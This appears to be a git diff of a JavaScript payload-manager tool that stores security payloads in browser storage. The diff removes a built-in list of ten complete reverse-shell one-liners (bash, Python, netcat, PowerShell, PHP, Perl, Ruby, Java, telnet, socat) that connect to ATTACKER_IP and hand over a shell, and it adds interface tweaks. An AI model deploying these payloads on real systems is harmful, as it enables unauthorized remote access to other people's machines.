@@ -30,89 +30,6 @@ const categoryNames = {
   'other': 'Other'
 };
 
-// Default reverse shell payloads
-const defaultReverseShells = [
-  {
-    name: "Bash Reverse Shell",
-    content: "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1",
-    category: "reverse-shell",
-    tags: ["bash", "tcp", "linux"],
-    date: new Date().toISOString()
-  },
-  {
-    name: "Python Reverse Shell",
-    content: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
-    category: "reverse-shell",
-    tags: ["python", "socket", "linux"],
-    date: new Date().toISOString()
-  },
-  {
-    name: "Netcat Reverse Shell",
-    content: "nc -e /bin/sh ATTACKER_IP PORT",
-    category: "reverse-shell",
-    tags: ["netcat", "nc", "linux"],
-    date: new Date().toISOString()
-  },
-  {
-    name: "PowerShell Reverse Shell",
-    content: "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
-    category: "reverse-shell",
-    tags: ["powershell", "windows", "tcp"],
-    date: new Date().toISOString()
-  },
-  {
-    name: "PHP Reverse Shell",
-    content: "<?php $sock=fsockopen(\"ATTACKER_IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");?>",
-    category: "reverse-shell",
-    tags: ["php", "fsockopen", "web"],
-    date: new Date().toISOString()
-  },
-  {
-    name: "Perl Reverse Shell",
-    content: "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
-    category: "reverse-shell",
-    tags: ["perl", "socket", "linux"],
-    date: new Date().toISOString()
-  },
-  {
-    name: "Ruby Reverse Shell",
-    content: "ruby -rsocket -e'f=TCPSocket.open(\"ATTACKER_IP\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
-    category: "reverse-shell",
-    tags: ["ruby", "tcp", "linux"],
-    date: new Date().toISOString()
-  },
-  {
-    name: "Java Reverse Shell",
-    content: "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor();",
-    category: "reverse-shell",
-    tags: ["java", "runtime", "linux"],
-    date: new Date().toISOString()
-  },
-  {
-    name: "Telnet Reverse Shell",
-    content: "telnet ATTACKER_IP PORT | /bin/bash | telnet ATTACKER_IP 4445",
-    category: "reverse-shell",
-    tags: ["telnet", "bash", "linux"],
-    date: new Date().toISOString()
-  },
-  {
-    name: "Socat Reverse Shell",
-    content: "socat tcp-connect:ATTACKER_IP:PORT exec:\"bash -li\",pty,stderr,setsid,sigint,sane",
-    category: "reverse-shell",
-    tags: ["socat", "tcp", "linux"],
-    date: new Date().toISOString()
-  }
-];
-
-// Initialize with default reverse shells if no payloads exist
-function initializeDefaultPayloads() {
-  const payloads = JSON.parse(localStorage.getItem("payloads") || "[]");
-  if (payloads.length === 0) {
-    localStorage.setItem("payloads", JSON.stringify(defaultReverseShells));
-    console.log("Initialized with default reverse shell payloads");
-  }
-}
-
 // Get filtered and sorted payloads
 function getFilteredPayloads() {
   const payloads = JSON.parse(localStorage.getItem("payloads") || "[]");
@@ -158,7 +75,7 @@ function loadPayloads() {
     container.innerHTML = `
       <div style="text-align: center; padding: 20px; opacity: 0.7; font-style: italic;">
         No payloads found.<br>
-        <span style="font-size: 12px; color: #00ffff;">Try adjusting your search or filters.</span>
+        <span style="font-size: 12px; color: #00ffff;">Add your first payload above.</span>
       </div>
     `;
     return;
@@ -185,8 +102,8 @@ function loadPayloads() {
       ${tagsHtml}
       <textarea readonly style="width:100%;height:60px;">${payload.content}</textarea>
       <div class="buttons">
-        <button class="copy">[ COPY ]</button>
-        <button class="delete">[ DELETE ]</button>
+        <button class="copy">COPY</button>
+        <button class="delete">DELETE</button>
       </div>
     `;
 
@@ -195,7 +112,7 @@ function loadPayloads() {
         // Show success feedback
         const btn = div.querySelector(".copy");
         const originalText = btn.textContent;
-        btn.textContent = "[ COPIED! ]";
+        btn.textContent = "COPIED!";
         btn.style.background = "linear-gradient(45deg, #00ff41, #00cc33)";
         btn.style.color = "#000";
         
@@ -231,6 +148,44 @@ function loadPayloads() {
 document.getElementById("search-input").addEventListener("input", loadPayloads);
 document.getElementById("category-filter").addEventListener("change", loadPayloads);
 document.getElementById("sort-by").addEventListener("change", loadPayloads);
+
+// Add close button functionality
+document.getElementById("close-btn").addEventListener("click", () => {
+  window.close();
+});
+
+// Add delete all payloads functionality
+function deleteAllPayloads() {
+  const payloads = JSON.parse(localStorage.getItem("payloads") || "[]");
+  if (payloads.length === 0) {
+    alert("No payloads to delete!");
+    return;
+  }
+  
+  if (confirm(`Are you sure you want to delete ALL ${payloads.length} payloads? This action cannot be undone.`)) {
+    localStorage.removeItem("payloads");
+    loadPayloads();
+    
+    // Show success message
+    const successDiv = document.createElement("div");
+    successDiv.className = "success";
+    successDiv.textContent = "All payloads deleted successfully!";
+    successDiv.style.marginTop = "10px";
+    
+    const payloadsContainer = document.querySelector(".payloads-container");
+    const existingSuccess = payloadsContainer.querySelector(".success");
+    if (existingSuccess) existingSuccess.remove();
+    
+    payloadsContainer.appendChild(successDiv);
+    
+    setTimeout(() => {
+      successDiv.remove();
+    }, 3000);
+  }
+}
+
+// Add delete all button event listener
+document.getElementById("delete-all-btn").addEventListener("click", deleteAllPayloads);
 
 document.getElementById("add-btn").addEventListener("click", () => {
   const name = document.getElementById("payload-name").value.trim();
@@ -314,5 +269,4 @@ document.addEventListener('keydown', (e) => {
 });
 
 // Initialize
-initializeDefaultPayloads();
 loadPayloads();
